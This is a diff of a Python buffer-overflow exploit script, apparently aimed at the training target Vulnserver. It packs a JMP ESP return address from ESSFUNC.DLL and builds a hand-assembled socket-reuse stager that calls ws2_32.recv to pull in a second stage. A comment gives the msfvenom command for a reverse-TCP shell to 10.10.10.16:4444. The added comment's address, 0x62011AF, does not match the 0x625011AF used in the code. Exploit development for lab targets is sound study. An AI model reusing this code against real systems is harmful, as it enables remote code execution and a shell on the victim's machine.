@@ -18,7 +18,8 @@ import time
 
 host = sys.argv[1]
 port = int(sys.argv[2])
-                                            
+
+# JMP ESP | 0x62011AF | ESSFUNC.DLL
 jmp_esp = struct.pack("<I", 0x625011AF)                                                  
                                             
 # nasm > add al, 0x6
@@ -39,20 +40,20 @@ Flags = 0
 addr of ws2_32.recv = 00401953
 """
 
-stager = "\x66\x83\xEC\x64"             # SUB SP,64     ; adjust stack to avoid corruption
-stager += "\x33\xC0"                    # XOR EAX,EAX   ; zero EAX
-stager += "\x33\xC9"                    # XOR ECX,ECX   ; zero ECX
-stager += "\x80\xC5\x04"                # ADD CH,4      ; ECX=0x400 (1024)
-stager += "\x54"                        # PUSH ESP      ;
-stager += "\x58"                        # POP EAX       ; Move stack pointer to EAX
-stager += "\x66\x83\xC0\x60"            # ADD AX,60     ; Setup Buffer for end of A's
-stager += "\x52"                        # PUSH EDX      ; Flags=0
-stager += "\x51"                        # PUSH ECX      ; BufSize=1024
-stager += "\x50"                        # PUSH EAX      ; Buffer=Addr of end of A's
-stager += "\x53"                        # PUSH EBX      ; SocketDescriptor already in EBX so no need to recalculate
+stager = "\x66\x83\xEC\x64"             # SUB SP,64        ; adjust stack to avoid corruption
+stager += "\x33\xC0"                    # XOR EAX,EAX      ; zero EAX
+stager += "\x33\xC9"                    # XOR ECX,ECX      ; zero ECX
+stager += "\x80\xC5\x04"                # ADD CH,4         ; ECX=0x400 (1024)
+stager += "\x54"                        # PUSH ESP         ;
+stager += "\x58"                        # POP EAX          ; Move stack pointer to EAX
+stager += "\x66\x83\xC0\x60"            # ADD AX,60        ; Setup Buffer for end of A's
+stager += "\x52"                        # PUSH EDX         ; Flags=0
+stager += "\x51"                        # PUSH ECX         ; BufSize=1024
+stager += "\x50"                        # PUSH EAX         ; Buffer=Addr of end of A's
+stager += "\x53"                        # PUSH EBX         ; SocketDescriptor already in EBX so no need to recalculate
 stager += "\xB8\x90\x2C\x25\x40"        # MOV EAX,40252C90 ; Setup EAX for ws2_32.recv
-stager += "\xC1\xE8\x08"                # SHR EAX,8     ; Correct EAX
-stager += "\xFF\xD0"                    # CALL EAX ; <JMP.&WS2_32.recv>
+stager += "\xC1\xE8\x08"                # SHR EAX,8        ; Correct EAX
+stager += "\xFF\xD0"                    # CALL EAX         ; <JMP.&WS2_32.recv>
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f python
 # x86/shikata_ga_nai succeeded with size 351 (iteration=0)
